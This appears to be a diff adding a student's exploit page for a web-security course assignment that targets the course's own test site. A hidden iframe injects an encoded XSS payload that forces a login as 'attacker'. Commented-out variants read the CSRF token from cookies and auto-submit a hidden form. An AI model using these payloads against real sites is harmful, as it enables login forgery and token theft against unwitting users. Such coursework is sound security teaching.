@@ -1,0 +1,40 @@
+
+<html>
+
+    <head>
+        <meta charset="UTF-8">
+        <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+        <script>
+            $(document).ready(function() {
+                
+                /*
+                console.log($("#postForm"));
+                $("#postForm").submit(function(event) {
+                    event.preventDefault();
+                    var url = "https://project2.eecs388.org/login?csrfdefense=1&xssdefense=0";
+                    $.ajax({
+                        type: "POST",
+                        url: url,
+                        data: $("#postForm").serialize(),
+                        xhrFields: {withCredentials: true},
+                    });
+                });
+                $("#postForm").submit();
+                */
+            });
+        </script> -->
+    </head>
+
+    <body>
+        <!-- <iframe src="https://project2.eecs388.org/search?q=hi" name="hiddenFrame" id="hiddenFrame" style=" width:80%; height:80%;"></iframe>
+         -->
+        <!-- <iframe src="https://project2.eecs388.org/search?csrfdefense=1&xssdefense=0&q=%3Cscript%3E+++++let+cookies+%3D+document.cookie%3B+++++let+token+%3D+cookies.substr%28cookies.indexOf%28%22csrf_token%22%29+%2B+11%29%3B+++++var+url+%3D+%22https%3A%2F%2Fproject2.eecs388.org%2Flogin%3Fcsrfdefense%3D0%22%3B+++++%24.ajax%28%7B+++++++++type%3A+%22POST%22%2C+++++++++url%3A+url%2C+++++++++data%3A+%7B+++++++++++++username%3A+%22attacker%22%2C+++++++++++++password%3A+%22l33th4x%22%2C+++++++++%7D%2C+++++++++xhrFields%3A+%7BwithCredentials%3A+true%7D%2C+++++%7D%29%3B+%3C%2Fscript%3E" name="hiddenFrame" id="hiddenFrame" style="width:80%; height:80%;"></iframe>
+         -->
+        <iframe src="https://project2.eecs388.org/search?csrfdefense=1&xssdefense=0&q=%3Cscript%3E+++++var+url+%3D+%22https%3A%2F%2Fproject2.eecs388.org%2Flogin%3Fcsrfdefense%3D0%22%3B+++++%24.ajax%28%7B+++++++++type%3A+%22POST%22%2C+++++++++url%3A+url%2C+++++++++xhrFields%3A+%7BwithCredentials%3A+true%7D%2C+++++++++data%3A+%7B+++++++++++++username%3A+%22attacker%22%2C+++++++++++++password%3A+%22l33th4x%22%2C+++++++++%7D%2C+++++%7D%29%3B+%3C%2Fscript%3E" style="visibility: hidden;"></iframe>
+        <iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
+        <form name="f" id="postForm" target="dummyframe">
+            <input type="hidden" name="username" value="attacker">
+            <input type="hidden" name="password" value="l33th4x">
+        </form>
+    </body>
+</html>
